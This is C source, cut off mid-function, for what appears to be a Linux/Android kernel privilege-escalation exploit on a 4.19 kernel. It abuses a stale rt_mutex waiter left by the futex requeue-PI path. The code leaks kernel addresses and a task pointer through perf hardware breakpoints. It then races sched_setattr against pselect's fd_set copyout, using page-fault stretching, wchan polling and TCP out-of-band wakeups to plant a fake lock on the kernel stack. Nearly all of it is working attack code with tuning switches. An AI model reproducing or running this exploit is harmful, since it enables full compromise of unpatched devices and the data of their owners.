#include "common.h"

#ifndef PSELECT_PERF_TARGET_SP_DIAG
#define PSELECT_PERF_TARGET_SP_DIAG 0
#endif
#ifndef PSELECT_PRESTART_WAITER_BEFORE_FOPS
#define PSELECT_PRESTART_WAITER_BEFORE_FOPS 0
#endif

struct target_sp_perf_ctx {
  int fd;
  unsigned char *mapping;
  size_t page_size;
  size_t ring_size;
  size_t map_size;
};

static struct target_sp_perf_ctx target_sp_perf = {.fd = -1};

static int ashmem_fops_hw_breakpoint_diag(void) {
  static const intptr_t deltas[] = {-0x10, 0};
  uintptr_t slot = data_addr(ASHMEM_MISC_FOPS);
  int usable = 0;

  for (size_t i = 0; i < sizeof(deltas) / sizeof(deltas[0]); i++) {
    struct perf_event_attr attr = {0};
    attr.type = PERF_TYPE_BREAKPOINT;
    attr.size = sizeof(attr);
    attr.disabled = 1;
    attr.exclude_user = 1;
    attr.exclude_hv = 1;
    attr.bp_type = 1; /* HW_BREAKPOINT_R */
    attr.bp_addr = (uintptr_t)((intptr_t)slot + deltas[i]);
    attr.bp_len = 8;

    int perf_fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
    if (perf_fd < 0) {
      pr_warning("ashmem fops hwbkpt open addr=%016llx delta=%lld errno=%d\n",
                 (unsigned long long)attr.bp_addr,
                 (long long)deltas[i], errno);
      continue;
    }
    usable = 1;
    ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
    int opened = 0;
    for (int n = 0; n < 16; n++) {
      int ashmem_fd = open_ashmem_device();
      if (ashmem_fd >= 0) {
        opened++;
        close(ashmem_fd);
      }
    }
    ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t count = 0;
    ssize_t count_ret = read(perf_fd, &count, sizeof(count));
    pr_info("ashmem fops hwbkpt addr=%016llx delta=%lld opens=%d "
            "count_ret=%zd count=%llu errno=%d\n",
            (unsigned long long)attr.bp_addr, (long long)deltas[i], opened,
            count_ret, (unsigned long long)count, errno);
    close(perf_fd);
  }
  return usable;
}

static void target_sp_ring_copy(void *dst, const unsigned char *ring,
                                size_t ring_size, uint64_t pos, size_t len) {
  size_t off = (size_t)(pos % ring_size);
  size_t first = ring_size - off;
  if (first > len) first = len;
  memcpy(dst, ring + off, first);
  if (first < len) memcpy((unsigned char *)dst + first, ring, len - first);
}

static int target_sp_perf_start(int tid) {
#if PSELECT_PERF_TARGET_SP_DIAG
  struct perf_event_attr attr = {0};
  attr.type = PERF_TYPE_BREAKPOINT;
  attr.size = sizeof(attr);
  attr.config = 0;
  attr.disabled = 1;
  attr.exclude_user = 1;
  attr.exclude_hv = 1;
  attr.bp_type = 4; /* HW_BREAKPOINT_X */
  attr.bp_addr = (uintptr_t)kaslr_base + 0x3a1d14;
  attr.bp_len = 4;
  attr.sample_period = 1;
  attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = (1ULL << 33) - 1;
  attr.wakeup_events = 1;
  target_sp_perf.fd =
      (int)syscall(__NR_perf_event_open, &attr, tid, -1, -1, 0);
  if (target_sp_perf.fd < 0) {
    pr_warning("pselect target-sp perf open tid=%d errno=%d\n", tid, errno);
    return 0;
  }
  target_sp_perf.page_size = (size_t)sysconf(_SC_PAGESIZE);
  target_sp_perf.ring_size = target_sp_perf.page_size * 8;
  target_sp_perf.map_size = target_sp_perf.page_size + target_sp_perf.ring_size;
  target_sp_perf.mapping =
      mmap(NULL, target_sp_perf.map_size, PROT_READ | PROT_WRITE, MAP_SHARED,
           target_sp_perf.fd, 0);
  if (target_sp_perf.mapping == MAP_FAILED) {
    pr_warning("pselect target-sp perf mmap errno=%d\n", errno);
    close(target_sp_perf.fd);
    target_sp_perf.fd = -1;
    target_sp_perf.mapping = NULL;
    return 0;
  }
  ioctl(target_sp_perf.fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(target_sp_perf.fd, PERF_EVENT_IOC_ENABLE, 0);
  pr_info("pselect target-sp breakpoint armed tid=%d addr=%016llx\n", tid,
          (unsigned long long)attr.bp_addr);
  return 1;
#else
  (void)tid;
  return 0;
#endif
}

static void target_sp_perf_stop_and_report(void) {
#if PSELECT_PERF_TARGET_SP_DIAG
  if (target_sp_perf.fd < 0 || !target_sp_perf.mapping) return;
  ioctl(target_sp_perf.fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *meta = (void *)target_sp_perf.mapping;
  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;
  if (head - tail > target_sp_perf.ring_size)
    tail = head - target_sp_perf.ring_size;
  uintptr_t core_start = (uintptr_t)kaslr_base + 0x3a1d14;
  uintptr_t core_end = (uintptr_t)kaslr_base + 0x3a2130;
  uintptr_t copy_start = (uintptr_t)kaslr_base + 0xbe40;
  uintptr_t copy_end = copy_start + 0x200;
  uintptr_t core_sp = 0;
  uintptr_t core_pc = 0;
  uintptr_t seen_sp[8] = {0};
  uintptr_t seen_pc[8] = {0};
  int seen_count = 0;
  int samples = 0, core_samples = 0, copy_samples = 0;
  while (tail < head) {
    struct perf_event_header hdr;
    target_sp_ring_copy(&hdr,
                        target_sp_perf.mapping + target_sp_perf.page_size,
                        target_sp_perf.ring_size, tail, sizeof(hdr));
    if (hdr.size < sizeof(hdr) || hdr.size > 1024) { tail++; continue; }
    unsigned char sample[1024];
    target_sp_ring_copy(sample,
                        target_sp_perf.mapping + target_sp_perf.page_size,
                        target_sp_perf.ring_size, tail, hdr.size);
    if (hdr.type == PERF_RECORD_SAMPLE &&
        hdr.size >= sizeof(hdr) + 8 + 34 * sizeof(uint64_t)) {
      uint64_t *regs = (void *)(sample + sizeof(hdr) + 8);
      if (regs[0] == PERF_SAMPLE_REGS_ABI_64) {
        uintptr_t sp = (uintptr_t)regs[32];
        uintptr_t pc = (uintptr_t)regs[33];
        samples++;
        if (seen_count < 8) {
          seen_sp[seen_count] = sp;
          seen_pc[seen_count] = pc;
          seen_count++;
        }
        if (pc >= core_start && pc < core_end) {
          core_samples++;
          /* Breakpoint is on the first instruction, before sub sp,#0x1c0. */
          core_sp = sp - 0x1c0;
          core_pc = pc;
        } else if (pc >= copy_start && pc < copy_end) {
          copy_samples++;
          core_sp = sp;
          core_pc = pc;
        }
      }
    }
    tail += hdr.size;
  }
  if (core_sp && runtime_waiter_stack_waiter >= core_sp + 0x50) {
    uintptr_t stack_fds = core_sp + 0x50;
    uintptr_t byte_delta = runtime_waiter_stack_waiter - stack_fds;
    pr_info("pselect target-sp perf samples=%d core=%d copy=%d pc=%016zx "
            "core_sp=%016zx stack_fds=%016zx waiter=%016zx "
            "delta=0x%zx global_word=%zu lock_global_word=%zu\n",
            samples, core_samples, copy_samples, core_pc, core_sp, stack_fds,
            runtime_waiter_stack_waiter, byte_delta, byte_delta / 8,
            byte_delta / 8 + 7);
  } else {
    pr_warning("pselect target-sp perf no core sample samples=%d core=%d "
               "copy=%d head=%llu last_sp=%016zx last_pc=%016zx\n",
               samples, core_samples, copy_samples, (unsigned long long)head,
               core_sp, core_pc);
  }
  for (int i = 0; i < seen_count; i++) {
    pr_info("pselect target-sp raw[%d] pc=%016zx sp=%016zx off=%016zx\n",
            i, seen_pc[i], seen_sp[i], seen_pc[i] - (uintptr_t)kaslr_base);
  }
  munmap(target_sp_perf.mapping, target_sp_perf.map_size);
  close(target_sp_perf.fd);
  target_sp_perf.fd = -1;
  target_sp_perf.mapping = NULL;
#endif
}

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int owner_tid;
static pthread_t prestarted_waiter;
static atomic_int waiter_prestart_ready;
static atomic_int waiter_prestart_go;
static atomic_int waiter_prestart_leak_ok;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int pselect_ready_peer_fd;
atomic_int pselect_ready_target_fd;
atomic_int pselect_write_drain_fd;
atomic_int pselect_returned;
atomic_int pselect_output_valid;
atomic_uintptr_t pselect_copyout_fault_base;
atomic_int pselect_copyout_fault_fd;
atomic_int pselect_sched_fire;
atomic_int pselect_sched_tid;
atomic_int pselect_sched_done;
atomic_uintptr_t pselect_sched_fire_ns;
atomic_int main_route_delay_usec;
size_t pselect_post_ready_delay_ns;
int pselect_post_ready_spin_iters;
size_t pselect_wchan_pre_sched_delay_ns;
int pselect_wchan_pre_sched_spin_iters;
static int pselect_sched_timing;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

static long long ns_delta_signed(size_t end_ns, size_t start_ns) {
  if (end_ns >= start_ns) {
    return (long long)(end_ns - start_ns);
  }
  return -(long long)(start_ns - end_ns);
}

static int pselect_fault_fdset_mask_runtime(void) {
  const char *forced = getenv("PSELECT_FAULT_FDSET_MASK_RUNTIME");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 7) {
      return (int)value;
    }
  }
#if defined(PSELECT_FAULT_ALL_FDSETS) && PSELECT_FAULT_ALL_FDSETS
  return 7;
#else
  return 4;
#endif
}

static void *pselect_sched_helper_thread(void *arg) {
  disable_rseq_for_thread();
  int helper_index = (int)(intptr_t)arg;
  int helper_core = PSELECT_SCHED_HELPER_CORE_BASE +
                    helper_index * PSELECT_SCHED_HELPER_CORE_STRIDE;
  pin_to_core(helper_core);

  int seen_fire = atomic_load(&pselect_sched_fire);
  while (!atomic_load(&punch_consume_stop)) {
    int fire = atomic_load(&pselect_sched_fire);
    if (fire == 0 || fire == seen_fire) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen_fire = fire;
    int tid = atomic_load(&pselect_sched_tid);
    if (tid > 0) {
      for (int call = 0; call < PSELECT_SCHED_HELPER_CALLS; call++) {
        int helper_nice = PSELECT_SCHED_HELPER_NICE;
#if defined(PSELECT_SCHED_HELPER_NICE_SPREAD) && \
    PSELECT_SCHED_HELPER_NICE_SPREAD
        /* Keep every helper request permitted for an unprivileged caller.
         * A single helper walks monotonically toward its configured final
         * nice value, matching the synchronous burst semantics. */
        helper_nice -= PSELECT_SCHED_HELPER_CALLS - 1 - call;
        if (helper_nice < 0) {
          helper_nice = 0;
        }
#endif
        size_t fired_ns = atomic_load(&pselect_sched_fire_ns);
#if defined(PSELECT_SCHED_HELPER_DELAY_NSEC) && \
    PSELECT_SCHED_HELPER_DELAY_NSEC > 0
        if (fired_ns) {
          while (gettime_ns() - fired_ns < PSELECT_SCHED_HELPER_DELAY_NSEC) {
            if (atomic_load(&pselect_returned)) break;
            __asm__ volatile("yield" ::: "memory");
          }
        }
        if (atomic_load(&pselect_returned)) {
          break;
        }
#endif
        size_t started_ns = pselect_sched_timing ? gettime_ns() : 0;
        errno = 0;
        long helper_ret = sched_setattr_tid(tid, helper_nice);
        int helper_errno = errno;
        size_t finished_ns = pselect_sched_timing ? gettime_ns() : 0;
        pr_info("pselect sched helper=%d core=%d call=%d ret=%ld errno=%d "
                "dispatch_ns=%lld elapsed_ns=%zu\n",
                helper_index, helper_core, call, helper_ret, helper_errno,
                fired_ns && started_ns ?
                    ns_delta_signed(started_ns, fired_ns) : 0,
                pselect_sched_timing ? finished_ns - started_ns : 0);
        if (atomic_load(&pselect_returned)) {
          break;
        }
      }
      atomic_fetch_add(&pselect_sched_done, 1);
    }
  }
  return NULL;
}

static int main_open_task_wchan(int tid) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
  return open(path, O_RDONLY | O_CLOEXEC);
}

static int main_read_wchan_fd(int fd, char *buf, size_t size) {
  if (fd < 0) return 0;
  ssize_t n = pread(fd, buf, size - 1, 0);
  if (n < 0) {
    if (lseek(fd, 0, SEEK_SET) < 0) return 0;
    n = read(fd, buf, size - 1);
  }
  if (n <= 0) return 0;
  buf[n] = 0;
  char *newline = strchr(buf, '\n');
  if (newline) *newline = 0;
  return 1;
}

static int main_wait_for_pselect_copyout(int wchan_fd, size_t timeout_usec,
                                          int tid, int nice,
                                          char *last_wchan,
                                          size_t last_wchan_size,
                                          long *sched_ret,
                                          int *sched_errno,
                                          size_t *sched_call_ns,
                                          size_t *sched_done_ns) {
  size_t deadline = gettime_ns() + timeout_usec * 1000ULL;
  while (gettime_ns() < deadline && !atomic_load(&pselect_returned)) {
    if (main_read_wchan_fd(wchan_fd, last_wchan, last_wchan_size) &&
#if defined(PSELECT_REQUIRE_FILEMAP_FAULT_WCHAN) && \
    PSELECT_REQUIRE_FILEMAP_FAULT_WCHAN
        strcmp(last_wchan, "filemap_fault") == 0) {
#else
        strcmp(last_wchan, "0") != 0 &&
        strncmp(last_wchan, "do_select", strlen("do_select")) != 0) {
#endif
      if (pselect_wchan_pre_sched_delay_ns != 0) {
        size_t delay_started_ns = gettime_ns();
        while (gettime_ns() - delay_started_ns <
               pselect_wchan_pre_sched_delay_ns) {
          if (atomic_load(&pselect_returned)) {
            return 0;
          }
          __asm__ volatile("yield" ::: "memory");
        }
      }
      for (int spin = 0; spin < pselect_wchan_pre_sched_spin_iters; spin++) {
        if (atomic_load(&pselect_returned)) {
          return 0;
        }
        __asm__ volatile("yield" ::: "memory");
      }
#if PSELECT_PERF_TARGET_SP_DIAG
      target_sp_perf_stop_and_report();
      return 1;
#endif
      if (PSELECT_SCHED_HELPERS > 0) {
        atomic_store(&pselect_sched_tid, tid);
        atomic_store(&pselect_sched_fire_ns, gettime_ns());
        atomic_fetch_add(&pselect_sched_fire, 1);
      }
      for (int call = 0; call < PSELECT_WCHAN_SCHED_BURST; call++) {
        int call_nice = nice;
#if defined(PSELECT_WCHAN_SCHED_NICE_SPREAD) && \
    PSELECT_WCHAN_SCHED_NICE_SPREAD
        /*
         * An unprivileged task may only lower its priority.  Alternating
         * 19/18 makes every 18 request fail after the first 19 request and
         * leaves the remaining 19 requests as no-ops.  Walk monotonically
         * toward the requested nice value so every burst call is a permitted
         * priority transition (for example 16,17,18,19).
         */
        call_nice -= PSELECT_WCHAN_SCHED_BURST - 1 - call;
        if (call_nice < 0) {
          call_nice = 0;
        }
#endif
        errno = 0;
        size_t call_start_ns = pselect_sched_timing ? gettime_ns() : 0;
        long ret = sched_setattr_tid(tid, call_nice);
        size_t call_done_ns = pselect_sched_timing ? gettime_ns() : 0;
        int ret_errno = errno;
#if defined(PSELECT_SCHED_DIAG) && PSELECT_SCHED_DIAG
        pr_info("pselect wchan sched call=%d/%d nice=%d ret=%ld errno=%d "
                "elapsed_ns=%lld returned=%d\n",
                call + 1, PSELECT_WCHAN_SCHED_BURST, call_nice, ret,
                ret_errno,
                call_done_ns && call_start_ns
                    ? ns_delta_signed(call_done_ns, call_start_ns)
                    : 0,
                atomic_load(&pselect_returned));
#endif
        if (call == 0 || ret == 0) {
          *sched_ret = ret;
          *sched_errno = ret_errno;
          if (sched_call_ns) {
            *sched_call_ns = call_start_ns;
          }
          if (sched_done_ns) {
            *sched_done_ns = call_done_ns;
          }
        }
        if (atomic_load(&pselect_returned)) {
          break;
        }
      }
      return 1;
    }
    __asm__ volatile("yield" ::: "memory");
  }
  return 0;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

#if defined(PERF_CURRENT_TASK_WAITER) && PERF_CURRENT_TASK_WAITER
  /* The dangling pi_blocked_on belongs to this thread.  Re-sample current so
   * the pselect waiter carries the task_struct sched_setattr(tid) walks. */
  if (!leak_current_task_perf()) {
    pr_error("waiter-thread task pointer leak failed tid=%d\n", tid);
  } else {
    pr_success("waiter-thread task pointer tid=%d task=%016zx\n",
               tid, runtime_waiter_task);
  }
#endif
#if PSELECT_PRESTART_WAITER_BEFORE_FOPS
  atomic_store(&waiter_prestart_leak_ok, runtime_waiter_task != 0);
  atomic_store(&waiter_prestart_ready, 1);
  while (!atomic_load(&waiter_prestart_go)) {
    usleep(1000);
  }
#endif

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

#if defined(LEGACY_USE_TCP_ROUTE) && LEGACY_USE_TCP_ROUTE
  do_tcp_fake_lock_route();
#else
  do_pselect_fake_lock_route();
#endif
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid, tid);

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  pr_info("consumer alive stop=%d\n", atomic_load(&punch_consume_stop));

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    {
      static int n;
      if ((n++ % 500000000) == 0)
        pr_info("consumer spin seq=%d seen=%d\n", seq, seen);
    }
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        atomic_fetch_add(&consumer_inflight, 1);
        int ready_peer = atomic_exchange(&pselect_ready_peer_fd, -1);
        int ready_target = atomic_exchange(&pselect_ready_target_fd, -1);
        int write_drain = atomic_exchange(&pselect_write_drain_fd, -1);
        size_t ready_exchange_ns =
            pselect_sched_timing && ready_peer >= 0 ? gettime_ns() : 0;
        size_t wake_done_ns = 0;
        size_t sync_done_ns = 0;
        size_t sched_call_ns = 0;
        size_t sched_done_ns = 0;
        int routed_pselect = ready_peer >= 0;
        int copyout_wchan_fd = -1;
        int copyout_sync_observed = 0;
        char copyout_wchan[64] = "<none>";
        int consumer_nice = PSELECT_CONSUMER_NICE;
        long sched_ret = -1;
        int sched_errno = 0;
        int sched_called_in_wait = 0;
        int disable_wchan_sync =
            getenv("PSELECT_DISABLE_WCHAN_SYNC_RUNTIME") != NULL;
        int sched_before_wake_runtime =
            getenv("PSELECT_SCHED_BEFORE_WAKE_RUNTIME") != NULL;
#if defined(PSELECT_VALIDATE_ONLY) && PSELECT_VALIDATE_ONLY
        size_t pselect_wake_started_ns = 0;
        /*
         * Diagnostic mode deliberately wakes pselect first.  This proves that
         * the fd_set image survived core_sys_select() and is copied back to
         * userspace unchanged, but it must never be used for the real route:
         * once pselect returns, its kernel stack frame no longer owns the stale
         * rt_mutex_waiter storage.
         */
        if (ready_peer >= 0) {
          pselect_wake_started_ns = gettime_ns();
          uintptr_t copyout_fault_base =
              atomic_exchange(&pselect_copyout_fault_base, 0);
          int copyout_fault_fd = atomic_load(&pselect_copyout_fault_fd);
          if (copyout_fault_base != 0) {
#if defined(PSELECT_EX_CROSS_PAGE_FAULT) && PSELECT_EX_CROSS_PAGE_FAULT
            const size_t validate_fault_page = 3;
#else
            const size_t validate_fault_page = 2;
#endif
            madvise((void *)(copyout_fault_base + validate_fault_page * PAGE_SIZE), PAGE_SIZE,
                    MADV_DONTNEED);
            if (copyout_fault_fd >= 0) {
              posix_fadvise(copyout_fault_fd,
                            validate_fault_page * PAGE_SIZE, PAGE_SIZE,
                            POSIX_FADV_DONTNEED);
            }
          }
#if defined(PSELECT_TCP_TRANSITION_ALL) && PSELECT_TCP_TRANSITION_ALL
          unsigned char validate_drain[65536];
          ssize_t validate_drained = 0;
          while (1) {
            ssize_t n = recv(ready_peer, validate_drain,
                             sizeof(validate_drain), MSG_DONTWAIT);
            if (n <= 0) break;
            validate_drained += n;
          }
          struct pollfd validate_writable = {
              .fd = ready_target,
              .events = POLLOUT,
          };
          int validate_poll_ret = -1;
          size_t validate_poll_deadline = gettime_ns() + 200000000ULL;
          do {
            validate_writable.revents = 0;
            validate_poll_ret = poll(&validate_writable, 1, 1);
          } while (validate_poll_ret == 0 &&
                   gettime_ns() < validate_poll_deadline);
          int validate_read_ret = send(ready_peer, "R", 1, MSG_DONTWAIT);
          int validate_oob_ret = send(ready_peer, "!", 1, MSG_OOB);
          pr_info("pselect validate TCP all drained=%zd pollout=%d/0x%x "
                  "read=%d oob=%d errno=%d\n",
                  validate_drained, validate_poll_ret,
                  validate_writable.revents, validate_read_ret,
                  validate_oob_ret, errno);
          if (validate_poll_ret <= 0 || !(validate_writable.revents & POLLOUT) ||
              validate_read_ret != 1 || validate_oob_ret != 1) {
            pr_warning("pselect readiness trigger errno=%d\n", errno);
          }
#else
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
          unsigned char wake_buf[4096];
          if (read(ready_peer, wake_buf, sizeof(wake_buf)) <= 0) {
#else
          if (send(ready_peer, "!", 1, MSG_OOB) != 1) {
#endif
            pr_warning("pselect readiness trigger errno=%d\n", errno);
          }
#endif
          while (!atomic_load(&pselect_returned)) {
            __asm__ volatile("yield" ::: "memory");
          }
          if (!atomic_load(&pselect_output_valid)) {
            pr_warning("pselect output validation failed; scheduler skipped\n");
            atomic_fetch_sub(&consumer_inflight, 1);
            break;
          }
          pr_info("pselect wake-to-userspace elapsed_ns=%zu\n",
                  gettime_ns() - pselect_wake_started_ns);
        }
#else
        /*
         * On this 4.19 build the stale waiter overlaps the result fd_sets.
         * Make the descriptors ready so do_select() materializes those bits,
         * then race sched_setattr() before core_sys_select() drops its frame.
         */
        uintptr_t copyout_fault_base =
            atomic_exchange(&pselect_copyout_fault_base, 0);
        int copyout_fault_fd = atomic_load(&pselect_copyout_fault_fd);
        if (copyout_fault_base != 0) {
          int fault_mask = pselect_fault_fdset_mask_runtime();
          int fault_ret = 0;
          int fault_page_count = 3;
#if defined(PSELECT_EX_CROSS_PAGE_FAULT) && PSELECT_EX_CROSS_PAGE_FAULT
          /* Preserve user ex.word0/1 in page 2, then fault the copy on the
           * fourth page.  This diagnoses copy order only; it does not imply
           * a matching kernel-stack waiter layout. */
          fault_mask = 1 << 3;
          fault_page_count = 4;
#endif
          for (int fault_page = 0; fault_page < fault_page_count; fault_page++) {
            if (!(fault_mask & (1 << fault_page))) {
              continue;
            }
            fault_ret |= madvise(
                (void *)(copyout_fault_base + fault_page * PAGE_SIZE),
                PAGE_SIZE, MADV_DONTNEED);
            if (copyout_fault_fd >= 0) {
              fault_ret |= posix_fadvise(
                  copyout_fault_fd, fault_page * PAGE_SIZE, PAGE_SIZE,
                  POSIX_FADV_DONTNEED);
            }
          }
          if (fault_ret != 0) {
            pr_warning("pselect copyout fault stretch errno=%d\n", errno);
          }
        }
#if defined(PSELECT_SYNC_COPYOUT_WCHAN) && PSELECT_SYNC_COPYOUT_WCHAN
        if (ready_peer >= 0 && !disable_wchan_sync) {
          copyout_wchan_fd = main_open_task_wchan(tid);
          if (copyout_wchan_fd < 0) {
            pr_warning("pselect copyout sync open wchan errno=%d\n", errno);
            atomic_fetch_sub(&consumer_inflight, 1);
            atomic_store(&punch_consume_go, 0);
            break;
          }
#if PSELECT_PERF_TARGET_SP_DIAG
          target_sp_perf_start(tid);
#endif
        }
#endif
#if defined(PSELECT_SCHED_BEFORE_WAKE) && PSELECT_SCHED_BEFORE_WAKE
        if (ready_peer >= 0 && !sched_called_in_wait) {
          atomic_store(&pselect_sched_tid, tid);
          atomic_fetch_add(&pselect_sched_fire, 1);
          errno = 0;
          sched_call_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_ret = sched_setattr_tid(tid, consumer_nice);
          sched_done_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_errno = errno;
          sched_called_in_wait = 1;
        }
#endif
        if (ready_peer >= 0 && sched_before_wake_runtime &&
            !sched_called_in_wait) {
          atomic_store(&pselect_sched_tid, tid);
          atomic_fetch_add(&pselect_sched_fire, 1);
          errno = 0;
          sched_call_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_ret = sched_setattr_tid(tid, consumer_nice);
          sched_done_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_errno = errno;
          sched_called_in_wait = 1;
        }
        if (ready_peer >= 0 &&
#if defined(PSELECT_PIPE_WAKE) && PSELECT_PIPE_WAKE
            ({ unsigned char wake_buf[4096];
               read(ready_peer, wake_buf, sizeof(wake_buf)) <= 0; })) {
#else
#if defined(PSELECT_TCP_TRANSITION_ALL) && PSELECT_TCP_TRANSITION_ALL
#if defined(PSELECT_TCP_OOB_LEAF_DIAG) && PSELECT_TCP_OOB_LEAF_DIAG
            ({ unsigned char drain_buf[65536];
               ssize_t tcp_drained = 0;
#if defined(PSELECT_BLOCK_WRITE_FDSET) && PSELECT_BLOCK_WRITE_FDSET
               ssize_t pipe_drained = 0;
               if (write_drain >= 0) {
                 int drain_flags = fcntl(write_drain, F_GETFL, 0);
                 if (drain_flags >= 0) {
                   fcntl(write_drain, F_SETFL, drain_flags | O_NONBLOCK);
                   for (;;) {
                     ssize_t n = read(write_drain, drain_buf, sizeof(drain_buf));
                     if (n <= 0) break;
                     pipe_drained += n;
                   }
                   fcntl(write_drain, F_SETFL, drain_flags);
                 }
               }
               pr_info("pselect OOB-leaf write pipe drained=%zd\n", pipe_drained);
#endif
#if defined(PSELECT_TCP_WAIT_POLLOUT) && PSELECT_TCP_WAIT_POLLOUT
               struct pollfd writable = {
                 .fd = ready_target,
                 .events = POLLOUT,
               };
               int poll_ret = -1;
               size_t poll_deadline = gettime_ns() + 200000000ULL;
               do {
                 for (;;) {
                   ssize_t n = recv(ready_peer, drain_buf, sizeof(drain_buf),
                                    MSG_DONTWAIT);
                   if (n <= 0) break;
                   tcp_drained += n;
                 }
                 writable.revents = 0;
                 poll_ret = ready_target >= 0 ? poll(&writable, 1, 1) : -1;
               } while (poll_ret == 0 && gettime_ns() < poll_deadline);
               pr_info("pselect TCP OOB-leaf drained=%zd pollout ret=%d "
                       "revents=0x%x errno=%d\n",
                       tcp_drained, poll_ret, writable.revents, errno);
#else
               while (recv(ready_peer, drain_buf, sizeof(drain_buf),
                           MSG_DONTWAIT) > 0) {}
#endif
               int oob_ret = send(ready_peer, "!", 1, MSG_OOB);
               int read_ret = send(ready_peer, "R", 1, MSG_DONTWAIT);
               oob_ret != 1 || read_ret != 1; })) {
#else
            ({ unsigned char drain_buf[65536];
               ssize_t tcp_drained = 0;
#if defined(PSELECT_REMAP_WRITE_FDS) && PSELECT_REMAP_WRITE_FDS
               int remapped = pselect_remap_write_fds();
               pr_info("pselect all-fd remap count=%d errno=%d\n",
                       remapped, errno);
#else
               for (;;) {
                 ssize_t n = recv(ready_peer, drain_buf, sizeof(drain_buf),
                                  MSG_DONTWAIT);
                 if (n <= 0) break;
                 tcp_drained += n;
               }
#endif
#if defined(PSELECT_BLOCK_WRITE_FDSET) && PSELECT_BLOCK_WRITE_FDSET
               if (write_drain >= 0) {
                 int drain_flags = fcntl(write_drain, F_GETFL, 0);
                 if (drain_flags >= 0) {
                   fcntl(write_drain, F_SETFL, drain_flags | O_NONBLOCK);
                   while (read(write_drain, drain_buf, sizeof(drain_buf)) > 0) {}
                   fcntl(write_drain, F_SETFL, drain_flags);
                 }
               }
#endif
#if defined(PSELECT_TCP_WAIT_POLLOUT) && PSELECT_TCP_WAIT_POLLOUT
               struct pollfd writable = {
                 .fd = ready_target,
                 .events = POLLOUT,
               };
               int poll_ret = -1;
               size_t poll_deadline = gettime_ns() + 200000000ULL;
               do {
                 for (;;) {
                   ssize_t n = recv(ready_peer, drain_buf, sizeof(drain_buf),
                                    MSG_DONTWAIT);
                   if (n <= 0) break;
                   tcp_drained += n;
                 }
                 writable.revents = 0;
                 poll_ret = ready_target >= 0 ? poll(&writable, 1, 1) : -1;
               } while (poll_ret == 0 && gettime_ns() < poll_deadline);
               pr_info("pselect TCP drain bytes=%zd pollout ret=%d "
                       "revents=0x%x errno=%d\n",
                       tcp_drained, poll_ret, writable.revents, errno);
#elif defined(PSELECT_TCP_DRAIN_SETTLE_USEC) && \
      PSELECT_TCP_DRAIN_SETTLE_USEC > 0
               usleep(PSELECT_TCP_DRAIN_SETTLE_USEC);
#endif
#if defined(PSELECT_TCP_OOB_FIRST) && PSELECT_TCP_OOB_FIRST
